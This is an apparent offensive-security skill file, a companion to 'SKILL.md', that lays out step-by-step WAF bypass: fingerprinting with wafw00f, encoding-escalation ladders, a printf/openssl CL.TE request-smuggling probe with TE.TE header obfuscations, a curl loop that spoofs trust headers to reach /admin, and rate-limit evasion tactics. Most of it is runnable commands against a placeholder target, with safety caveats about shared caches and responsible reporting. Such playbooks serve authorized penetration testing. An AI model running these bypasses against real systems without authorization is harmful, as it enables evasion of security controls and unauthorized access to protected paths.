# WAF Bypass — Deep Workflows

Companion to SKILL.md. Fingerprinting, smuggling, trust-header abuse.

## Step 1: Fingerprint the WAF

```bash
wsl wafw00f https://target.example.com -a
# Manual probes: send obvious payload, inspect block page markers:
#   Cloudflare (cf-ray, "Attention Required"), Akamai (Reference #),
#   Imperva/Incapsula (_Incapsula_Resource), AWS WAF (403 HTML generic)
```

## Step 2: Baseline the block behavior

```bash
# Record for ONE known-blocked payload:
#   status, response length, server header, timing
curl -s -D - "https://target.example.com/?q=<blocked-payload>" -o blocked.html
# All bypass attempts compare against THIS baseline.
```

## Step 3: Encoding-layer ladder (post-block only)

```text
1. Case/whitespace variants
2. Single URL encode (%3C)
3. Double URL encode (%253C)          <- often passes naive decode-once
4. Unicode escapes \u003c in JSON bodies
5. Multipart parameter pollution (same param twice: which parser wins?)
6. Content-Type switch (form -> JSON with same semantic fields)
7. Chunked transfer splitting keywords across chunks
```

## Step 4: HTTP request smuggling (differential detection)

```bash
# CL.TE probe: front-end uses Content-Length, back-end chunked.
# Send ONCE and time it; second request delayed => desync suspected.
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\n\
Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404check HTTP/1.1\r\nX: ' \
| timeout 10 openssl s_client -quiet -connect target:443

# TE.CL inverse. TE.TE: obfuscate one header:
#   Transfer-Encoding: xchunked
#   Transfer-Encoding : chunked      (space before colon)
#   X: x\nTransfer-Encoding: chunked (header folding)
# SAFETY: use only harmless differential payloads (/404check), never poison
# other users' responses on shared infrastructure.
```

## Step 5: Trust-header abuse for IP-restricted paths

```bash
# If /admin allows internal IPs behind WAF:
for h in "X-Forwarded-For" "X-Real-IP" "Client-IP" "True-Client-IP" \
         "X-Originating-IP" "CF-Connecting-IP" "Fastly-Client-IP"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "$h: 127.0.0.1" https://target.example.com/admin)
  echo "$h -> $code"
done
# Any non-blocked code = access control keyed on spoofable header.
```

## Step 6: Rate-limit evasion

```text
- Rotate X-Forwarded-For per request (if limit keyed on it)
- Random case + padding bytes in values (cache/WAF key divergence)
- Spread across path aliases (/api/v1/x vs //api/v1/x vs /api%2fv1/x)
- Jitter all requests >=0.1-0.5s; never fixed intervals
```

## False-positive elimination

1. Smuggling needs TWO consistent differential proofs + no shared-cache
   poisoning of real users; report responsibly or skip if shared CDN.
2. Header-trust bypass: verify a privileged ACTION works, not just render.
3. Encoding bypass must show the payload REACHED app logic (behavior change).
